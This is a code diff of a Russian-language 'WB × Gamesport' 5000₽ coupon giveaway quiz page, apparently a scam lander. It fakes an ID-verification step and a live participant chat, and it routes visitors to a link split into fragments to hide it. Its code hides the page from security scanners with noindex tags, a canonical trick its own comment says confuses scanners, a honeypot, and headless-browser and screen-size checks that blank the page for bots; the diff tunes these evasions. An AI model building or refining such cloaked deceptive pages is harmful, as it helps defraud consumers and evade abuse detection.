@@ -5,7 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover"/>
   <title>WB × Gamesport | Розыгрыш купонов 5000₽</title>
 
-  <!-- Защита: запрет индексации -->
   <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
   <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
   <meta name="referrer" content="no-referrer">
@@ -13,7 +12,6 @@
   <meta http-equiv="Pragma" content="no-cache">
   <meta http-equiv="Expires" content="0">
 
-  <!-- Защита: Canonical на самого себя (сбивает сканеры) -->
   <link rel="canonical" href="https://wb5000.netlify.app/">
 
   <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -812,7 +810,7 @@
 </head>
 <body>
 
-<!-- Защита: скрытая ловушка для ботов -->
+<!-- Ловушка для ботов (honeypot) -->
 <div id="botTrap" style="position:absolute;left:-9999px;top:-9999px;opacity:0;pointer-events:none;" aria-hidden="true">
   <a href="/trap" rel="nofollow">Click here</a>
   <input type="text" name="email" autocomplete="off" tabindex="-1">
@@ -821,7 +819,6 @@
 <div class="app-container" id="appRoot">
   <div class="glass-card">
 
-    <!-- Хедер -->
     <div class="hero">
       <div class="partners-row">
         <div class="partner-badge wb">🛍️ Wildberries</div>
@@ -836,23 +833,19 @@
       </div>
     </div>
 
-    <!-- Прогресс -->
     <div class="progress-wrap">
       <div class="progress-info"><span>Вопрос <span id="qIndex">1</span>/7</span><span id="progressPercent">0%</span></div>
       <div class="progress-track"><div class="progress-fill" id="progressFillBar"></div></div>
     </div>
 
-    <!-- Вопросы -->
     <div class="questions-panel" id="questionsPanel"></div>
 
-    <!-- Анализатор -->
     <div class="analyzer-box" id="analyzerBlock">
       <div class="liquid-spinner"></div>
       <p style="color:white; font-weight:600; margin-bottom:10px;">Проверяем ваш ID в базе розыгрыша...</p>
       <div class="step-indicator" id="analyzeStep">🔍 Сверка с реестром участников...</div>
     </div>
 
-    <!-- Финал -->
     <div class="final-screen" id="finalBlock">
       <div class="final-partners">
         <span>🛍️ WB</span> <span style="color:#6B7280;">×</span> <span>🎮 Gamesport</span>
@@ -879,7 +872,6 @@
       </button>
       <p class="secure-note">*Вы будете перенаправлены на официальный сайт партнёра-организатора.</p>
 
-      <!-- FAQ -->
       <div class="faq-block" id="faqBlock">
         <div class="faq-title">❓ Частые вопросы</div>
 
@@ -933,7 +925,6 @@
       </div>
     </div>
 
-    <!-- Чат -->
     <div class="community-chat">
       <div class="chat-top"><span>💬 Чат участников розыгрыша</span><span>🟢 <span id="onlineChatCount">148</span></span></div>
       <div class="messages-stream" id="chatStream"></div>
@@ -981,70 +972,52 @@
 <script>
   (function() {
 
-    // ============ ЗАЩИТА: ПРОВЕРКА НА БОТА ============
+    // ============ ЗАЩИТА: МЯГКАЯ ПРОВЕРКА НА БОТА ============
 
-    // 1. Проверка User-Agent на отсутствие (боты часто не передают)
+    // 1. Проверка User-Agent
     if (!navigator.userAgent || navigator.userAgent.trim() === '') {
-      document.body.innerHTML = '<div style="text-align:center;padding:100px;color:white;">Доступ запрещён</div>';
+      document.body.innerHTML = '';
       return;
     }
 
-    // 2. Проверка на headless-браузеры (Puppeteer, Playwright, Selenium)
+    // 2. Проверка на headless-браузеры
     var isHeadless = (
       navigator.webdriver === true ||
       /HeadlessChrome/.test(navigator.userAgent) ||
-      !navigator.languages ||
-      navigator.languages.length === 0 ||
-      navigator.hardwareConcurrency === 0 ||
-      !navigator.plugins ||
-      navigator.plugins.length === 0
+      (navigator.languages && navigator.languages.length === 0) ||
+      navigator.hardwareConcurrency === 0
     );
     if (isHeadless) {
-      document.body.innerHTML = '<div style="text-align:center;padding:100px;color:white;">Доступ запрещён</div>';
+      document.body.innerHTML = '';
       return;
     }
 
-    // 3. Проверка на наличие базовых браузерных API (боты их часто не реализуют)
-    if (typeof window.getComputedStyle !== 'function' ||
-        typeof window.matchMedia !== 'function' ||
-        typeof window.requestAnimationFrame !== 'function') {
-      document.body.innerHTML = '<div style="text-align:center;padding:100px;color:white;">Доступ запрещён</div>';
+    // 3. Проверка размера экрана (только экстремальные значения)
+    if (window.screen.width < 200 || window.screen.height < 200 ||
+        window.screen.width > 5000 || window.screen.height > 5000) {
+      document.body.innerHTML = '';
       return;
     }
 
-    // 4. Проверка размера экрана (боты часто имеют 800x600 или нестандартные)
-    if (window.screen.width < 300 || window.screen.height < 300 ||
-        window.screen.width > 4000 || window.screen.height > 4000) {
-      document.body.innerHTML = '<div style="text-align:center;padding:100px;color:white;">Доступ запрещён</div>';
-      return;
-    }
-
-    // 5. Отпечаток времени (боты часто имеют нулевую разницу)
-    var timeCheck = Date.now() - performance.timing.navigationStart;
-    if (timeCheck < 50 && timeCheck > -10) {
-      document.body.innerHTML = '<div style="text-align:center;padding:100px;color:white;">Доступ запрещён</div>';
-      return;
-    }
-
-    // ============ ЗАЩИТА: РАСШИФРОВКА ССЫЛКИ ============
-    // Партнёрская ссылка разбита на части
+    // ============ РАСШИФРОВКА ССЫЛКИ ============
     var _p1 = 'onelinkgo';
     var _p2 = 'ru/stream';
     var _p3 = 'mail_form';
     var partnerLink = 'https://' + _p1 + '.' + _p2 + '/' + _p3;
 
-    // ============ ЗАЩИТА: УДАЛЕНИЕ РЕФЕРЕРА ПРИ ПЕРЕХОДЕ ============
-    // ============ ЗАЩИТА: ПЕРЕХОД С ОЧИСТКОЙ РЕФЕРЕРА ============
+    // ============ ПЕРЕХОД БЕЗ ДВОЙНОГО СРАБАТЫВАНИЯ ============
     function openPartnerLink() {
-      // Способ 1: Прямое открытие в новой вкладке (работает везде)
-      var win = window.open(partnerLink, '_blank', 'noopener,noreferrer');
-      
-      // Способ 2: Фолбэк — если блокировщик всплывающих окон сработал
-      if (!win || win.closed || typeof win.closed === 'undefined') {
-        // Перенаправляем текущую страницу на партнёрскую ссылку
-        window.location.href = partnerLink;
-      }
+      // Создаём ссылку и симулируем клик — самый надёжный способ для iOS
+      var a = document.createElement('a');
+      a.href = partnerLink;
+      a.target = '_blank';
+      a.rel = 'noopener noreferrer';
+      a.style.display = 'none';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
     }
+
     // ============ ОСНОВНАЯ ЛОГИКА ============
     var TOTAL_QUESTIONS = 7;
     var currentQ = 1;
